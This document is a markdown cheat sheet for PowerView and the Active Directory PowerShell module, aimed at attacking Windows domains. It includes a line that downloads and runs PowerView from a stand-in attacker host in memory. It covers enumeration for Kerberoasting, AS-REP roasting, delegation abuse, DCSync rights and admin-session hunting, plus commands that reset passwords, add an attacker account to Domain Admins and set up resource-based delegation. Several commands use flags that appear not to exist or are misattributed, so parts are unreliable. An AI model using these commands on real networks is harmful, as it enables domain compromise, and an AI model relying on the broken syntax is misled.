# <span style="color:rgb(255, 192, 0)">PowerView & Active Directory Module - Complete Command Reference</span>

**PowerView** is the recon part of PowerSploit by @harmj0y. The **Active Directory Module** is Microsoft's official RSAT PowerShell module.

---

## <span style="color:rgb(255, 0, 0)">PowerView (PowerSploit)</span>

### Loading PowerView

```powershell
# Load from disk
Import-Module .\PowerView.ps1

# Load from URL (bypass execution policy)
iex (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Load from base64
$b64 = [Convert]::ToBase64String((Invoke-WebRequest -Uri 'http://attacker/PowerView.ps1' -UseBasicParsing).Content)
iex ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64)))
```

### Domain Basic Information

```powershell
# Get current domain
Get-NetDomain

# Get specific domain info
Get-NetDomain -Domain target.local

# Get current user info
Get-NetCurrentUser

# Get domain SID
Get-DomainSID

# Get domain policy
Get-DomainPolicy
(Get-DomainPolicy)."System Access"     # Password policy
(Get-DomainPolicy)."Kerberos Policy"   # Kerberos settings

# Get domain functional level
Get-NetDomain | select DomainMode

# Get forest info
Get-NetForest
Get-NetForest -Forest target.local
Get-NetForestDomain
Get-NetForestCatalog

# Get forest trusts
Get-NetForestTrust
Get-NetForestTrust -Forest target.local

# Get current computer domain
Get-DomainComputer -Identity $env:COMPUTERNAME

# Get DC list
Get-NetDomainController
```

### User Enumeration

```powershell
# List all domain users
Get-NetUser
Get-NetUser -Domain target.local

# Specific user
Get-NetUser -Identity Administrator

# Users in specific OU
Get-NetUser -OU "OU=Admins,DC=domain,DC=local"

# All properties
Get-NetUser -Identity jdoe | Select-Object *

# Find descriptions (often has passwords)
Get-NetUser -Properties description,admincount,lastlogon
Get-NetUser -LDAPFilter "(description=*)"

# Kerberoastable users (have SPN)
Get-NetUser -SPN
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname

# AS-REP roastable users
Get-NetUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# Users with Don't Require Pre-Auth
Get-DomainUser -PreauthNotRequired

# Users with SID History
Get-NetUser -LDAPFilter "(sidHistory=*)"

# Users in protected group
Get-NetUser -AdminCount

# Users with trusted delegation
Get-NetUser -TrustedToAuth
Get-NetUser -TrustedForDelegation
Get-NetUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# Users with constrained delegation
Get-NetUser -LDAPFilter "(msDS-AllowedToDelegateTo=*)"

# Users logged in (sessions)
Get-NetUser -LogonCount

# Recently changed passwords
Get-NetUser -LDAPFilter "(pwdLastSet>=133000000000000000)"
```

### Computer Enumeration

```powershell
# List all computers
Get-NetComputer

# Computers with operating system info
Get-NetComputer -OperatingSystem
Get-NetComputer -FullData

# Computers with SP
Get-NetComputer -ServicePrincipalName

# Computers with unconstrained delegation
Get-NetComputer -Unconstrained

# Computers in specific site
Get-NetComputer -Site "Default-First-Site-Name"

# Computers with local admin access (current user)
Get-NetComputer -CurrentUser

# Find computers by OS
Get-NetComputer -OperatingSystem "Windows Server 2016"
Get-NetComputer -OperatingSystem "Windows 10*"

# Only servers
Get-NetComputer -Domain target.local | Where-Object {$_.OperatingSystem -like "*Server*"}

# Ping computers
Get-NetComputer -Ping

# Print servers
Get-NetComputer -ServicePrincipalName "*print*"

# SQL servers
Get-NetComputer -ServicePrincipalName "*MSSQL*"
```

### Group Enumeration

```powershell
# List all groups
Get-NetGroup

# List domain admins
Get-NetGroup -GroupName "Domain Admins"

# List members of group
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Enterprise Admins"

# Recursive group membership
Get-NetGroupMember -GroupName "Domain Admins" -Recurse

# Groups a user is member of
Get-NetGroup -UserName "jdoe"

# Find groups with admin privileges
Get-NetGroup -AdminCount

# Local group on computer
Get-NetLocalGroup -ComputerName target
Get-NetLocalGroupMember -ComputerName target -GroupName Administrators

# Domain group with local admin access
Get-NetLocalGroup -ComputerName target -Recurse

# Foreign users (from other domains)
Get-NetGroup -LDAPFilter "(objectSid=*)"

# All group memberships for current user
Get-NetGroup -UserName $env:USERNAME
```

### OU & GPO Enumeration

```powershell
# List OUs
Get-NetOU

# Specific OU
Get-NetOU -OUName "OU=Admins,DC=domain,DC=local"

# OUs with GPO links
Get-NetGPO
Get-NetGPO -ComputerName target

# GPOs applied to specific computer
Get-NetGPO -ComputerIdentity target$

# Find GPO that modifies local administrators
Get-NetGPO | Where-Object {$_.DisplayName -like "*Admin*"}

# Find vulnerable GPOs (writable by non-admin)
Get-NetGPO | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}

# Find OUs with non-admin delegation
Get-NetOU | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write"}
```

### ACL/ACE Enumeration

```powershell
# Get ACL for specific object
Get-ObjectAcl -Identity Administrator

# Get ACL with resolved names
Get-ObjectAcl -Identity Administrator -ResolveGUIDs

# Get ACL for domain root
Get-ObjectAcl -Identity "DC=domain,DC=local"

# Find interesting ACLs (GenericAll, Write, etc.)
Get-ObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl"}

# Find ACLs where current user has rights
Get-ObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq $((Get-NetCurrentUser).objectsid)}

# Find interesting ACLs for all domain objects
Invoke-ACLScanner -ResolveGUIDs

# Find ACLs with specific rights
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

# Check if user can DCSync
Get-ObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "DS-Replication-Get-Changes-All"}

# Find all modifyable ACLs
Find-InterestingDomainAcl -ResolveGUIDs
```

### Share & File Enumeration

```powershell
# Find shares on domain
Invoke-ShareFinder

# Find shares on specific computers
Invoke-ShareFinder -ExcludeStandard

# Find shares with verbose
Invoke-ShareFinder -Verbose -Domain domain.local

# Find files with specific keywords on shares
Invoke-FileFinder -Sensitive

# Custom file search
Invoke-FileFinder -Terms *password*,*secret*,*admin* -Verbose

# Check SMB shares
Get-NetShare -ComputerName target

# List files in SMB share
ls \\target\share\folder
```

### Session & Admin Access Enumeration

```powershell
# Find computers where domain admin has session
Invoke-UserHunter

# Stealth session search
Invoke-UserHunter -Stealth

# Check if current user has admin access
Invoke-CheckLocalAdminAccess

# Find admin access for specific user
Invoke-UserHunter -UserName "Administrator"

# Find sessions of specific group members
Invoke-UserHunter -GroupName "Domain Admins"

# Check local admin access on all domain computers
Find-LocalAdminAccess
```

### Trust Enumeration

```powershell
# Get domain trusts
Get-NetTrust
Get-NetTrust -Domain target.local

# Get forest trusts
Get-NetForestTrust
Get-NetForestTrust -Forest target.local

# Get all trusts (recursive)
Get-NetDomainTrust -Recurse

# Foreign users (SID history from other domains)
Get-NetUser -LDAPFilter "(sidHistory=*)"

# Foreign groups
Get-NetGroup -LDAPFilter "(|(groupType=8)(groupType=-2147483640))" -FullData
```

### Delegation Enumeration

```powershell
# Find unconstrained delegation
Get-NetComputer -Unconstrained

# Find constrained delegation
Get-NetComputer -TrustedToAuth
Get-NetUser -TrustedToAuth

# Find Resource-Based Constrained Delegation (RBCD)
Get-NetComputer -RBCD
Get-NetComputer -RBCDService

# Find delegation for specific user
Get-NetUser -LDAPFilter "(msDS-AllowedToDelegateTo=*)" -Properties samaccountname,msDS-AllowedToDelegateTo
```

### Domain/User Privilege Escalation

```powershell
# Find if current user can add computer
Get-DomainObject -Identity "DC=domain,DC=local" | Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "Write" -and $_.SecurityIdentifier -eq $((Get-NetCurrentUser).objectsid)}

# Check MachineAccountQuota
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# Force password change
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force) -Verbose

# Add user to group
Add-DomainGroupMember -Identity "Domain Admins" -Members attackeruser -Verbose

# Create computer account
New-MachineAccount -MachineName ATTACKER\$ -Password (ConvertTo-SecureString "Pass123!" -AsPlainText -Force)

# Set RBCD on target
Set-DomainObject -Identity "CN=target,CN=Computers,DC=domain,DC=local" -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=...}
```

---

## <span style="color:rgb(0, 176, 240)">Active Directory Module (Microsoft RSAT)</span>

### Loading

```powershell
# Check if module exists
Get-Module -ListAvailable ActiveDirectory

# Import
Import-Module ActiveDirectory

# If not installed, install RSAT:
# Windows 10/11: Settings > Apps > Optional Features > RSAT: Active Directory DS and LDS Tools
# Or via PowerShell:
Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online
```

### User Commands

```powershell
# Get all users
Get-ADUser -Filter *
Get-ADUser -Filter * -Properties *

# Specific user
Get-ADUser -Identity Administrator -Properties *

# Users in OU
Get-ADUser -Filter * -SearchBase "OU=Admins,DC=domain,DC=local"

# Find disabled users
Get-ADUser -Filter {Enabled -eq $false}

# Find users with expired password
Get-ADUser -Filter {PasswordExpired -eq $true}

# Find users with SPN (Kerberoastable)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# Users without pre-auth (AS-REP roastable)
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Users with SID history
Get-ADUser -Filter {SIDHistory -ne "$null"} -Properties SIDHistory

# Find users not required password
Get-ADUser -Filter {PasswordNotRequired -eq $true} -Properties PasswordNotRequired

# Last logon before date
Get-ADUser -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)} -Properties LastLogonDate

# Users created recently
Get-ADUser -Filter {Created -gt (Get-Date).AddDays(-30)} -Properties Created

# All disabled users
Get-ADUser -Filter {Enabled -eq $false}

# Count users
(Get-ADUser -Filter *).Count

# User with no password expiry
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires

# Export users to CSV
Get-ADUser -Filter * -Properties * | Export-CSV users.csv
```

### Computer Commands

```powershell
# All computers
Get-ADComputer -Filter *

# Specific computer
Get-ADComputer -Identity target -Properties *

# Computers with OS
Get-ADComputer -Filter {OperatingSystem -like "*Server*"}

# Computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Computers with constrained delegation
Get-ADComputer -Filter {msDS-AllowedToDelegateTo -like "*"}

# Computers last logon
Get-ADComputer -Filter {LastLogonDate -lt (Get-Date).AddDays(-90)} -Properties LastLogonDate

# Computers by DNS name
Get-ADComputer -LDAPFilter "(|(dnsHostName=*sql*)(dnsHostName=*web*))"

# Find Enabled computers
Get-ADComputer -Filter {Enabled -eq $true}

# List all DCs
Get-ADDomainController -Filter * | Select-Object Name,IPv4Address,OperatingSystem,ServerRoles
```

### Group Commands

```powershell
# All groups
Get-ADGroup -Filter *

# Domain Admins members
Get-ADGroupMember -Identity "Domain Admins"
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Enterprise Admins
Get-ADGroupMember -Identity "Enterprise Admins"

# Find groups with adminCount
Get-ADGroup -Filter {AdminCount -eq 1}

# Users in a group
Get-ADGroup -Filter {Members -contains "CN=User,DC=domain,DC=local"}

# Nested group membership
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object Name,ObjectClass

# All groups user belongs to
Get-ADPrincipalGroupMembership -Identity jdoe

# Foreign security principals
Get-ADObject -Filter {ObjectClass -eq "foreignSecurityPrincipal"} -Properties * | Format-List

# Find empty groups
Get-ADGroup -Filter * -Properties Members | Where-Object { -not $_.Members }
```

### Domain & Forest Commands

```powershell
# Domain info
Get-ADDomain
Get-ADDomain -Identity target.local

# Domain modes
Get-ADDomain | Select-Object DomainMode,ForestMode

# Forest info
Get-ADForest
Get-ADForest -Identity target.local

# Trusts
Get-ADTrust
Get-ADTrust -Identity target.local
Get-ADTrust -Filter *

# Domain controller
Get-ADDomainController -Filter *
Get-ADDomainController -Discover -Service "Kerberos"
```

### GPO Commands

```powershell
# All GPOs
Get-GPO -All

# GPO by name
Get-GPO -Name "Default Domain Policy"

# GPO report
Get-GPOReport -Name "Default Domain Policy" -ReportType HTML -Path report.html

# GPO permissions
Get-GPPermission -Name "Default Domain Policy" -All

# GPO backup
Backup-GPO -Name "Default Domain Policy" -Path C:\Backups

# Linked GPOs for OU
Get-GPInheritance -Target "OU=Admins,DC=domain,DC=local"
```

### Search & Specific Queries

```powershell
# AD object search
Get-ADObject -Filter {ObjectClass -eq "user" -and Description -like "*pass*"} -Properties Description

# Objects with specific ACL
Get-ADObject -Filter {ObjectAcl -like "*"}

# Users with specific attributes
Get-ADUser -LDAPFilter "(&(objectCategory=person)(objectClass=user)(adminCount=1))"

# Custom LDAP filter
Get-ADUser -LDAPFilter "(&(samAccountName=*admin*)(enabled=TRUE))"

# Find all OUs
Get-ADOrganizationalUnit -Filter *

# Find all service connection points
Get-ADObject -Filter {ObjectClass -eq "serviceConnectionPoint"} -Properties *
```

### Object Modification Commands

```powershell
# Add user to group
Add-ADGroupMember -Identity "Domain Admins" -Members attacker

# Remove user from group
Remove-ADGroupMember -Identity "Domain Admins" -Members attacker

# Change password
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)

# Enable/Disable account
Enable-ADAccount -Identity jdoe
Disable-ADAccount -Identity jdoe

# Move object
Move-ADObject -Identity "CN=jdoe,CN=Users,DC=domain,DC=local" -TargetPath "OU=Admins,DC=domain,DC=local"

# Unlock account
Unlock-ADAccount -Identity jdoe

# Set attribute
Set-ADUser -Identity jdoe -Description "New Description"

# Create user
New-ADUser -Name "NewUser" -SamAccountName newuser -UserPrincipalName newuser@domain.local -Enabled $true -AccountPassword (ConvertTo-SecureString "Pass123!" -AsPlainText -Force)

# Create computer
New-ADComputer -Name "ATTACKER" -Enabled $true
```

---

## <span style="color:rgb(146, 208, 80)">PowerView vs AD Module Comparison</span>

| Feature | PowerView | AD Module |
|---------|-----------|-----------|
| Installation | Download .ps1 | RSAT feature |
| Availability | Any Windows | Win10/11/Srv2012+ |
| AD objects | Excellent | Good |
| ACL/ACE enum | Excellent (Invoke-ACLScanner) | Manual via Get-Acl |
| Session enum | Yes (Invoke-UserHunter) | Limited |
| Delegation enum | Yes | Manual LDAP |
| GPO enum | Good | Good (via GPMC) |
| Trust enum | Good | Good |
| Object modification | Yes (Set-DomainUserPassword, Add-DomainGroupMember) | Yes (native) |
| Audit/Security | Excellent (Find-InterestingDomainAcl) | Manual |
| OPSEC | PowerShell logging | May need module |

---

## <span style="color:rgb(255, 0, 0)">Common Workflows</span>

### Initial Domain Recon (PowerView)

```powershell
# 1. Basic info
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy

# 2. Users + groups
Get-NetUser | Select-Object samaccountname,description,lastlogon
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-NetGroup -AdminCount

# 3. Computers
Get-NetComputer -OperatingSystem | Select-Object dnshostname,operatingsystem
Get-NetComputer -Unconstrained
Get-NetComputer -TrustedToAuth

# 4. ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# 5. Sessions
Invoke-UserHunter -Stealth

# 6. Shares
Invoke-ShareFinder -ExcludeStandard

# 7. Kerberoastable
Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
```

### Privilege Escalation Checks (PowerView)

```powershell
# Check MachineAccountQuota
Get-DomainObject -Identity "DC=domain,DC=local" -Properties ms-DS-MachineAccountQuota

# Find writable ACLs
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -eq $((Get-NetCurrentUser).objectsid)}

# Check delegation on computers
Get-DomainComputer -Unconstrained

# Find users with SPN
Get-DomainUser -SPN

# Check if user can DCSync
Get-ObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "Replication-Get-Changes"}
```

### BloodHound Data Collection (PowerView)

```powershell
# Not built-in; use SharpHound
# But PowerView can replicate some:
Get-NetUser -FullData | Export-CSV users.csv
Get-NetComputer -FullData | Export-CSV computers.csv
Get-NetGroup -FullData | Export-CSV groups.csv
```
